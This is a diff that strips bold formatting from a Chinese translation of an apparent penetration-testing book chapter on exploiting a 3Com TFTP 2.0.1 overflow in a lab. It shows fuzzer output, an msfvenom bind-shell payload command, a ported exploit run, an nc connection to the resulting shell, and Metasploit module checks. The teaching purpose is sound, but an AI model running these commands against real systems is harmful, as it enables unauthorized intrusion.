@@ -106,7 +106,7 @@ for value in bufferarray: ❹
 示例 19-4. 测试 3Com TFTP
 
 ```
-root@kali:~# **./tftpfuzzer**
+root@kali:~# ./tftpfuzzer
 Fuzzing with length100
 ('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00',❶ ('192.168.20.10', 4484))
@@ -248,7 +248,7 @@ $**jmp_2000 = "\x4E\xAE\x45\x7E";**
 如前所述，我们还需要用 Msfvenom 生成的代码替换 shellcode。我们可以使用 bind shell 或任何适合 344 + 129 字节（包括 shellcode 和 NOP sled）的 Windows payload。我们需要避免的唯一坏字符是空字节。告诉 Msfvenom 以 Perl 格式输出 payload，以便我们可以轻松将其添加到我们的 exploit 中。
 
 ```
-root@kali:~# **msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f perl**
+root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f perl
 ```
 
 ### 编辑 Exploit
@@ -317,12 +317,12 @@ exit;
 示例 19-7. 运行移植的漏洞
 
 ```
-root@kali:~# **./exploitdbexploit.pl 192.168.20.10 69**
+root@kali:~# ./exploitdbexploit.pl 192.168.20.10 69
 ++ Building Malicious Packet .....
 ++ Exploit packet sent ...
 ++ Done.
 ++ Telnet to 4444 on victim's machine ....
-root@kali:~# **nc 192.168.20.10 4444**
+root@kali:~# nc 192.168.20.10 4444
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
@@ -346,7 +346,7 @@ Metasploit 模块是用 Ruby 编写的。
 示例 19-8. Metasploit 模块示例
 
 ```
-root@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# **cat**
+root@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# cat
 **futuresoft_transfermode.rb**
 ##
 # This module requires Metasploit: http//metasploit.com/download
@@ -565,8 +565,8 @@ end ❼
 我们现在已经为 3Com TFTP 2.0.1 长传输模式漏洞编写了一个利用模块。将文件保存在 */root/.msf4/modules/exploits/windows/tftp/myexploit.rb*，然后运行 Msftidy 工具对模块进行格式验证，确保其符合 Metasploit 模块的格式规范。在提交模块到 Metasploit 仓库之前，按照 Msftidy 提出的建议进行任何格式更改。
 
 ```
-root@kali:~# **cd /usr/share/metasploit-framework/tools/**
-root@kali:/usr/share/metasploit-framework/tools# **./msftidy.rb /root/.msf4/modules/exploits/windows/tftp/myexploit.rb**
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+root@kali:/usr/share/metasploit-framework/tools# ./msftidy.rb /root/.msf4/modules/exploits/windows/tftp/myexploit.rb
 ```
 
 ### 注意
